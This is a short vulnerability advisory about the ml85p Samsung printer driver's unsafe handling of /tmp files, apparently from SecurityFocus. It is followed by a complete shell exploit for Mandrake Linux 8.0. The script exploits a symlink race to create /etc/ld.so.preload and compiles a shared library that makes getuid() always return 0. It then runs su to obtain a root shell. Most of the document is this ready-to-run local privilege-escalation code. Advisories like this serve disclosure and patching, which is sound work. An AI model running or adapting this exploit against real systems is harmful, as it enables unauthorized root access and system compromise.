source: http://www.securityfocus.com/bid/3008/info
 
ml85p is a Linux driver for Samsung ML-85G series printers. It may be bundled with distributions of Ghostscript.
 
ml85p does not check for symbolic links when creating image output files.
 
These files are created in /tmp with a guessable naming format, making it trivial for attackers to exploit this vulnerability.
 
Since user-supplied data is written to the target file, attackers may be able to elevate privileges.

#!/bin/sh
# Exploit using /usr/bin/ml85p default setuid program on 
# Mandrake Linux 8.0
#
# You need to be in the sys group to be able to execute 
# ml85p.

echo "** ml85p exploit"
# set the required umask
umask 0

# get the number of seconds since 1970
DATE=`date +"%s"`
if [ ! -u /usr/bin/ml85p ] || [ ! -x /usr/bin/ml85p ]
then
	echo "** this exploit requires that /usr/bin/ml85p is setuid and 
executable."
	exit 1
fi

if [ ! -e /etc/ld.so.preload ] || [ ! -w /etc/ld.so.preload ]
then
	echo "** this exploit requires that /etc/ld.so.preload does not exist."
	exit 1
fi

echo "** creating file"
ln -s /etc/ld.so.preload /tmp/ml85g"$DATE"
echo "bleh" | /usr/bin/ml85p -s
rm /tmp/ml85g"$DATE"

echo "** creating shared library"
cat << _EOF_ > /tmp/g.c
int getuid(void) { return(0); }
_EOF_

echo "** compiling and linking shared object"
gcc -c -o /tmp/g.o /tmp/g.c
ld -shared -o /tmp/g.so /tmp/g.o
rm -f /tmp/g.c /tmp/g.o

echo "** rigging ld.so.preload"
echo "/tmp/g.so" > /etc/ld.so.preload
echo "** execute su. warning all getuid() calls will return(0) until you remove"
echo "** the line \"/tmp/g.so\" from /etc/ld.so.preload. removing /tmp/g.so 
without"
echo "** first fixing /etc/ld.so.preload may result in system malfunction"
su -
echo "** cleaning up"
> /etc/ld.so.preload
rm -f /tmp/g.so